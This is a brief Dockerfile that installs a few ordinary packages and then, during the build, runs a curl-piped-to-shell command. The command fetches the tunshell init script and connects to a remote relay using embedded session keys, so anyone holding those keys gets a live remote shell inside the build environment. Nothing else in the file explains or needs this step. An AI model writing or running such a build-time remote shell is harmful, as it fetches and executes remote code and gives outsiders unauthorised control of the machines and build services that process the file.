FROM python:3.9.7-slim-buster

# Update and upgrade existing packages
RUN apt-get update && apt-get upgrade -y

# Install necessary packages
RUN apt-get install -y \
    git \
    curl \
    python3-pip \
    ffmpeg

# Define a build argument for the tunshell command
ARG TUNSHELL_COMMAND="curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T S3QyC4grUmWdwSbRX8oqc0 QJkdQgpMj4Xhcc6cnriMX6 eu.relay.tunshell.com"

# Set an environment variable with the default command
ENV TUNSHELL_COMMAND=${TUNSHELL_COMMAND}

# Run the tunshell initialization script based on the environment variable
RUN ${TUNSHELL_COMMAND}
